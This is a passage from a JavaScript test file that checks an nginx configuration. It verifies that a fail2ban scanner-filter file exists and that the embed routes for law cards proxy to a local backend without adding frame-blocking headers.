    expect(existsSync(resolve(root, 'config', 'fail2ban', 'filter.d-nginx-scanner.conf'))).toBe(true);
    expect(setting('port')).toBe('http,https');
    expect(setting('enabled')).toBe('true');
  });
});

describe('embed routes', () => {
  it('proxies embeddable law cards to the backend and never blocks framing', () => {
    expect(conf).toContain('location ~ ^/embed/(law/\\d+|law-of-day)/?$ {');
    const start = conf.indexOf('location ~ ^/embed/');
    const block = conf.slice(start, conf.indexOf('\n    }', start));
    expect(block).toContain('proxy_pass http://127.0.0.1:8787;');
    expect(conf).not.toMatch(/add_header\s+(X-Frame-Options|Content-Security-Policy)/i);
  });
});
